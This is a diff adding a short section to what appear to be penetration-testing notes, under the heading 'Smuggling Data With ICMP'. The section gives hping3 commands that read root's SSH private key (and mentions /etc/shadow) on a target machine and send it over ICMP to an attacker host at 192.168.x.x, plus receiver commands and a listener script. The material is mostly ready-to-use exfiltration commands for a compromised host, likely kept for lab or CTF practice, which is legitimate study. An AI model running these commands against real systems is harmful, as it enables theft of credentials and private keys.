@@ -3000,3 +3000,21 @@ webadmin@serv:/notes$ ls /notes
 clear.sh  id.sh
 webadmin@serv:/notes$ 
 
+# Smuggling Data With ICMP
+
+Summary: Tools like hping3 can be used to read local files and send the contents of it to a remote host. 
+	 This is useful to read /etc/shadow or root's id_rsa. 
+
+# On Target machine, outputting to other local session: 
+	hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa 
+
+# Receiver Side:
+ 	sudo hping3 --icmp 127.0.0.1 --listen signature --safe 
+
+# On Target machine, outputing to Kali:
+  	hping3 --icmp 192.168.x.x -d 100 --sign signature --file /root/.ssh/id_rsa 
+
+# On kali machine
+  	sudo python ./icmp_receiver.py
+
+
